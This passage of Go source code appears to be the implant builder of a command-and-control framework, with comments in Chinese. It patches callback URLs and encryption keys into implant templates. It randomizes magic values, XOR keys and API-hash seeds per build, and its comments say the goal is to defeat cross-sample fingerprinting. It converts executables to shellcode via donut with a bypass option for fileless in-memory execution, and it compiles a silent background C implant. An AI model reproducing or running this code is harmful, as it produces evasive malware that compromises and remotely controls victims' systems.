func transportForProtocol(protocol string) string {
	switch strings.ToLower(protocol) {
	case "tcp", "":
		return "tcp"
	case "http", "https":
		return "http"
	case "websocket", "ws", "wss":
		return "websocket"
	case "mqtt", "mqtts":
		return "mqtt"
	default:
		return "tcp"
	}
}

func appendConfigBlock(shellcode []byte, serverURL, encryptionKeyB64 string, opts *BuildOptions) []byte {
	cfg := map[string]interface{}{
		"server_url":     serverURL,
		"encryption_key": encryptionKeyB64,
	}
	if opts != nil {
		cfg["interval"] = opts.Interval
		cfg["jitter"] = opts.Jitter
		cfg["retry_wait"] = opts.RetryWait
		cfg["kill_date"] = opts.KillDate
		cfg["working_hours"] = opts.WorkingHours
		cfg["relay_listen"] = opts.RelayListen
		cfg["front_domain"] = opts.FrontDomain
		cfg["transport"] = transportForProtocol(opts.Protocol)
	}
	jsonData, _ := json.Marshal(cfg)

	lenBuf := make([]byte, 4)
	binary.BigEndian.PutUint32(lenBuf, uint32(len(jsonData)))

	// 每构建随机魔数/密钥（P0-1：打破跨样本同指纹）。未提供时回退包级默认（兼容旧 shellcode 工具）。
	magic := []byte(configBlockMagic)
	key := configBlockKey[:]
	if opts != nil {
		if opts.CfgMagic != "" {
			magic = []byte(opts.CfgMagic)
		}
		key = opts.CfgKey[:]
	}
	magicEnc := xorBlockKey(magic, key)

	block := make([]byte, 0, len(magicEnc)+4+len(jsonData))
	block = append(block, magicEnc...)
	block = append(block, xorBlockKeyAtKey(lenBuf, len(magicEnc), key)...)
	block = append(block, xorBlockKeyAtKey(jsonData, len(magicEnc)+4, key)...)
	return append(shellcode, block...)
}

// xorBlockKeyAtKey 用给定循环密钥逐字节加密/解密，密钥流从块内偏移 startOff 开始。
func xorBlockKeyAtKey(b []byte, startOff int, key []byte) []byte {
	out := make([]byte, len(b))
	for i := 0; i < len(b); i++ {
		out[i] = b[i] ^ key[(startOff+i)%len(key)]
	}
	return out
}

// injectBuildConstants 把每构建随机生成的配置块魔数与 XOR 密钥注入植入端源码
// （P0-1：打破跨样本同指纹）。必须在 obfuscateImplantSources 之前调用：
//   - main.go 的 configBlockMagic：明文改成随机值，之后字符串混淆器会按固定 xd 基准
//     把它再加密（不同明文→不同密文）；植入端运行时 xd 解出新值，与服务端写块一致。
//   - obfuscate.go 的 blockKey：obfuscate.go 被混淆器跳过，原样进二进制，可安全持有注入值。
func (b *Builder) injectBuildConstants(tmpDir string, opts *BuildOptions) error {
	// obfuscate.go（解码层，被跳过不混淆）
	if data, err := os.ReadFile(filepath.Join(tmpDir, "obfuscate.go")); err == nil {
		content := string(data)
		content = strings.ReplaceAll(content,
			"var blockKey = [4]byte{0x5A, 0xC3, 0x2D, 0x9F}",
			fmt.Sprintf("var blockKey = [4]byte{0x%02X, 0x%02X, 0x%02X, 0x%02X}", opts.CfgKey[0], opts.CfgKey[1], opts.CfgKey[2], opts.CfgKey[3]))
		content = strings.ReplaceAll(content,
			"var xdBase byte = 0x5A",
			fmt.Sprintf("var xdBase byte = 0x%02X", opts.XfBase))
		_ = os.WriteFile(filepath.Join(tmpDir, "obfuscate.go"), []byte(content), 0644)
	}
	// main.go（configBlockMagic 明文；obfuscate 会再混淆它，但明文不同 → 密文不同）
	if data, err := os.ReadFile(filepath.Join(tmpDir, "main.go")); err == nil {
		content := strings.ReplaceAll(string(data),
			`var configBlockMagic = "TOSHELL_CFG_V1:"`,
			fmt.Sprintf(`var configBlockMagic = %q`, opts.CfgMagic))
		_ = os.WriteFile(filepath.Join(tmpDir, "main.go"), []byte(content), 0644)
	}
	// apihash_windows.go（FNF-1a 种子/乘子随机化）
	if data, err := os.ReadFile(filepath.Join(tmpDir, "apihash_windows.go")); err == nil {
		content := string(data)
		content = strings.ReplaceAll(content,
			"var apiHashSeed uint32 = 0x811c9dc5",
			fmt.Sprintf("var apiHashSeed uint32 = 0x%08X", opts.ApiHashSeed))
		content = strings.ReplaceAll(content,
			"var apiHashMul uint32 = 0x01000193",
			fmt.Sprintf("var apiHashMul uint32 = 0x%08X", opts.ApiHashMul))
		_ = os.WriteFile(filepath.Join(tmpDir, "apihash_windows.go"), []byte(content), 0644)
	}
	return nil
}

// xorBlockKeyAt 用循环密钥逐字节加密/解密，密钥流从块内偏移 startOff 开始
// （与植入端 xdBlockAt 完全一致）。位置无关，长度不变。
func xorBlockKeyAt(b []byte, startOff int) []byte {
	out := make([]byte, len(b))
	for i := 0; i < len(b); i++ {
		out[i] = b[i] ^ configBlockKey[(startOff+i)%len(configBlockKey)]
	}
	return out
}

// AppendConfigToShellcode 将新的 serverURL（及可选加密密钥）写入 shellcode 尾部配置块。
// 若 shellcode 已有配置块则先剥离旧块再追加新块，确保幂等。
// encryptionKeyB64 传空字符串则保留 shellcode 编译时内嵌的默认密钥。
func AppendConfigToShellcode(shellcode []byte, serverURL, encryptionKeyB64 string) []byte {
	shellcode = stripConfigBlock(shellcode)
	return appendConfigBlock(shellcode, serverURL, encryptionKeyB64, nil)
}

// stripConfigBlock 剥离 shellcode 尾部已有的配置块（如有）。
// 通过加密 magic 常量序列定位块起点（无需解密整个文件），按位置裁剪。
func stripConfigBlock(shellcode []byte) []byte {
	magic := configBlockMagicEnc
	mlen := len(magic)
	if len(shellcode) < mlen+4 {
		return shellcode
	}
	// 找最后一个 magic 作为配置块起点标记
	start := -1
	for i := len(shellcode) - mlen; i >= 0; i-- {
		if bytes.Equal(shellcode[i:i+mlen], magic) {
			start = i
			break
		}
	}
	if start < 0 {
		return shellcode
	}
	return shellcode[:start]
}

func (b *Builder) buildShellcode(opts BuildOptions) (*BuildResult, error) {
	binary, err := b.compile(opts)
	if err != nil {
		return nil, fmt.Errorf("failed to compile: %v", err)
	}

	shellcode, err := b.generateShellcodeWithDonut(binary, opts.Arch)
	if err != nil {
		return nil, fmt.Errorf("failed to generate shellcode: %v", err)
	}

	// 追加尾部配置块，使 shellcode 在运行时可动态读取回连地址
	cfg := config.Get()
	encKeyB64 := base64.StdEncoding.EncodeToString([]byte(cfg.Listener.EncryptionKey))
	shellcode = appendConfigBlock(shellcode, opts.ServerURL, encKeyB64, &opts)

	// XOR 加密（如开启）
	var xorKey []byte
	hasXOR := false
	if opts.XOREncrypt {
		keySize := opts.XORKeySize
		if keySize <= 0 {
			keySize = 16 // default
		}
		xorKey, err = generateRandomKey(keySize)
		if err != nil {
			logging.Warn("builder", "XOR key generation failed, skipping XOR encryption: %v", err)
		} else {
			shellcode = xorEncrypt(shellcode, xorKey)
			hasXOR = true
			logging.Info("builder", "XOR encryption applied (key_size=%d)", keySize)
		}
	}

	configData, _ := json.Marshal(b.buildConfig(opts))
	shellcodeHex := hex.EncodeToString(shellcode)
	shellcodeBase64 := base64.StdEncoding.EncodeToString(shellcode)

	return &BuildResult{
		Binary:          shellcode,
		Config:          configData,
		Shellcode:       shellcode,
		ShellcodeHex:    shellcodeHex,
		ShellcodeBase64: shellcodeBase64,
		XORKey:          xorKey,
		HasXOR:          hasXOR,
	}, nil
}

// ConvertToShellcode 将任意 PE 二进制（EXE/DLL）经 donut 转换为位置无关 shellcode，
// 供"全内存无文件执行"管线在服务端完成 EXE→shellcode 转换后，交由植入端内存注入执行。
func (b *Builder) ConvertToShellcode(binary []byte, arch string) ([]byte, error) {
	return b.generateShellcodeWithDonut(binary, arch)
}

// generateShellcodeWithDonut generates shellcode using the donut library
func (b *Builder) generateShellcodeWithDonut(binary []byte, arch string) ([]byte, error) {
	targetArch := donut.X84
	switch arch {
	case "386":
		targetArch = donut.X32
	case "amd64":
		targetArch = donut.X64
	default:
		targetArch = donut.X84
	}

	donutConfig := &donut.DonutConfig{
		Arch:       targetArch,
		InstType:   donut.DONUT_INSTANCE_PIC,
		Type:       donut.DONUT_MODULE_EXE,
		Entropy:    donut.DONUT_ENTROPY_DEFAULT,
		Thread:     0, // 在当前线程中运行
		Compress:   1,
		Unicode:    0,
		ExitOpt:    2, // ExitProcess
		Format:     1,
		Bypass:     3,
		Parameters: "",
	}

	shellcode, err := donut.ShellcodeFromBytes(bytes.NewBuffer(binary), donutConfig)
	if err != nil {
		return nil, fmt.Errorf("donut shellcode generation failed: %v", err)
	}

	return shellcode.Bytes(), nil
}

func (b *Builder) buildShellcodeBin(opts BuildOptions) (*BuildResult, error) {
	binary, err := b.compile(opts)
	if err != nil {
		return nil, fmt.Errorf("failed to compile: %v", err)
	}

	shellcode, err := b.generateShellcodeWithDonut(binary, opts.Arch)
	if err != nil {
		return nil, fmt.Errorf("failed to generate shellcode: %v", err)
	}

	configData, _ := json.Marshal(b.buildConfig(opts))

	return &BuildResult{
		Binary:    shellcode,
		Config:    configData,
		Shellcode: shellcode,
	}, nil
}

// ─── C 植入端编译管线 ────────────────────────────────────────────────
//
// 使用 mingw-w64 gcc（x86_64-w64-mingw32-gcc 或 i686-w64-mingw32-gcc）
// 编译 internal/server/builder/implant_c/main.c，产出体积极小的 PE
// （约 50KB，Go 版 3.3MB 的 1/60）。支持 x86/x64 架构。
// 占位符替换与 Go 模板一致（{{SERVER_URL}}/{{ENCRYPTION_KEY}}/{{INTERVAL}}/{{RETRY_WAIT}}）。
// 配置块（TOSHELL_CFG_V1）由 appendConfigBlock 统一追加，C 端启动时解析。

// resolveCGCCPath 探测 mingw gcc：优先按目标架构选 x86_64/i686 前缀，
// 其次探测 PATH 中的 gcc（clang 兼容性差，仅接受 mingw）。
func resolveCGCCPath(arch string) string {
	binName := "gcc"
	if runtime.GOOS == "windows" {
		binName = "gcc.exe"
	}
	candidates := []string{}
	if arch == "386" || arch == "x86" {
		candidates = append(candidates, "i686-w64-mingw32-gcc"+extIfWindows(binName))
	} else {
		candidates = append(candidates, "x86_64-w64-mingw32-gcc"+extIfWindows(binName))
	}
	// 常见 msys2 安装路径
	for _, base := range []string{`C:\msys64`, `C:\msys2`, `C:\mingw64`, `C:\mingw32`} {
		if arch == "386" || arch == "x86" {
			candidates = append(candidates,
				filepath.Join(base, "mingw32", "bin", binName),
				filepath.Join(base, "ucrt32", "bin", binName),
			)
		} else {
			candidates = append(candidates,
				filepath.Join(base, "mingw64", "bin", binName),
				filepath.Join(base, "ucrt64", "bin", binName),
			)
		}
	}
	for _, c := range candidates {
		if c == "" {
			continue
		}
		if info, err := os.Stat(c); err == nil && !info.IsDir() {
			return c
		}
	}
	// PATH 兜底（仅接受 mingw 风格的 gcc）
	if p, err := exec.LookPath(binName); err == nil {
		return p
	}
	return ""
}

func extIfWindows(binName string) string {
	if strings.Contains(binName, ".exe") {
		return ".exe"
	}
	return ""
}

// buildCExecutable 编译 C 植入端并追加配置块。
func (b *Builder) buildCExecutable(opts BuildOptions) (*BuildResult, error) {
	if opts.Format != "exe" && opts.Format != "bin" && opts.Format != "raw" {
		return nil, fmt.Errorf("C implant supports exe/bin/raw formats, got %s", opts.Format)
	}

	srcDir := filepath.Join(b.implantDir, "..", "implant_c")
	if info, err := os.Stat(filepath.Join(srcDir, "main.c")); err != nil || info.IsDir() {
		// 模板目录可能只配置了 Go 模板；尝试可执行文件同目录
		if exePath, err := os.Executable(); err == nil {
			alt := filepath.Join(filepath.Dir(exePath), "implant_c", "main.c")
			if info2, err2 := os.Stat(alt); err2 == nil && !info2.IsDir() {
				srcDir = filepath.Join(filepath.Dir(exePath), "implant_c")
			} else {
				return nil, fmt.Errorf("C implant template not found (expected implant_c/main.c next to implant dir or server binary)")
			}
		} else {
			return nil, fmt.Errorf("C implant template not found")
		}
	}

	gccPath := resolveCGCCPath(opts.Arch)
	if gccPath == "" {
		return nil, fmt.Errorf("mingw-w64 gcc not found; install MSYS2 (x86_64-w64-mingw32-gcc) or put gcc in PATH")
	}

	// 生成临时源文件（替换占位符）
	tmpDir, err := os.MkdirTemp("", "toshell-cbuild-*")
	if err != nil {
		return nil, err
	}
	defer os.RemoveAll(tmpDir)

	cfg := config.Get()
	key := []byte(cfg.Listener.EncryptionKey)
	encKeyB64 := base64.StdEncoding.EncodeToString(key)

	data, err := os.ReadFile(filepath.Join(srcDir, "main.c"))
	if err != nil {
		return nil, fmt.Errorf("failed to read C template: %v", err)
	}
	content := string(data)
	// C 模板：{{SERVER_URL}} 位于 C 字符串字面量内部（static char g_server[256] = "{{SERVER_URL}}"），
	// 只需转义引号与反斜杠，防止 `"; 恶意C代码; //` 注入编译出的 C 植入端。
	content = strings.ReplaceAll(content, "{{SERVER_URL}}", cQuote(opts.ServerURL))
	content = strings.ReplaceAll(content, "{{ENCRYPTION_KEY}}", encKeyB64)
	content = strings.ReplaceAll(content, "{{INTERVAL}}", fmt.Sprintf("%d", opts.Interval))
	content = strings.ReplaceAll(content, "{{RETRY_WAIT}}", fmt.Sprintf("%d", opts.RetryWait))
	// P0-1: 每构建随机注入 C 端配置块魔数与 XOR 密钥（三端一致，打破跨样本同指纹）
	content = strings.ReplaceAll(content, `#define CFG_MAGIC "TOSHELL_CFG_V1:"`,
		fmt.Sprintf(`#define CFG_MAGIC "%s"`, opts.CfgMagic))
	content = strings.ReplaceAll(content, `static const unsigned char g_xorKey[4] = {0x5A, 0xC3, 0x2D, 0x9F};`,
		fmt.Sprintf("static const unsigned char g_xorKey[4] = {0x%02X, 0x%02X, 0x%02X, 0x%02X};",
			opts.CfgKey[0], opts.CfgKey[1], opts.CfgKey[2], opts.CfgKey[3]))
	srcFile := filepath.Join(tmpDir, "main.c")
	if err := os.WriteFile(srcFile, []byte(content), 0644); err != nil {
		return nil, err
	}

	outputName := "implant"
	if opts.OS == "windows" {
		outputName = "implant.exe"
	}
	outputPath := filepath.Join(tmpDir, outputName)

	// 编译：-Os 优化体积、-s 去符号、gc-sections 裁未用节、
	// -mwindows 指定 GUI 子系统（不弹控制台黑窗，后台静默运行）
	args := []string{"-Os", "-s", "-ffunction-sections", "-fdata-sections",
		"-Wl,--gc-sections", "-mwindows", "-o", outputPath, srcFile,
		"-lws2_32", "-lbcrypt", "-ladvapi32"}
	cmd := exec.Command(gccPath, args...)
	cmd.Dir = tmpDir
	if output, err := cmd.CombinedOutput(); err != nil {
		logging.Error("builder", "C build failed: %v, output: %s", err, string(output))
		return nil, fmt.Errorf("C build failed: %v", err)
	}

	binary, err := os.ReadFile(outputPath)
	if err != nil {
		return nil, fmt.Errorf("failed to read C build output: %v", err)
	}

	// 追加配置块（与 Go 植入端同一格式）
	binary = appendConfigBlock(binary, opts.ServerURL, encKeyB64, &opts)

	configData, _ := json.Marshal(b.buildConfig(opts))
	return &BuildResult{
		Binary: binary,
		Config: configData,
	}, nil
}

// CLanguageAvailable 返回 C 植入端是否可用（mingw gcc 存在且模板齐全）。
func (b *Builder) CLanguageAvailable() bool {
	// 模板存在性
	srcDir := filepath.Join(b.implantDir, "..", "implant_c")
	ok := false
	if info, err := os.Stat(filepath.Join(srcDir, "main.c")); err == nil && !info.IsDir() {
		ok = true
	}
	if !ok {
		if exePath, err := os.Executable(); err == nil {
			if info, err2 := os.Stat(filepath.Join(filepath.Dir(exePath), "implant_c", "main.c")); err2 == nil && !info.IsDir() {
				ok = true
			}
		}
	}
	if !ok {
		return false
	}
	return resolveCGCCPath("amd64") != ""
}

// cQuote 转义字符串以安全嵌入 C 字符串字面量（模板形如 "{{SERVER_URL}}" 自带引号）：
// 反斜杠与双引号转义，其余原样保留。防 `"; 恶意代码; //` 注入。
func cQuote(s string) string {
	var b strings.Builder
	for _, r := range s {
		switch r {
		case '\\':
			b.WriteString(`\\`)
		case '"':
			b.WriteString(`\"`)
		case '\n':
			b.WriteString(`\n`)
		case '\r':
			b.WriteString(`\r`)
		case '\t':
			b.WriteString(`\t`)
		default:
			b.WriteRune(r)
		}
	}
	return b.String()
}
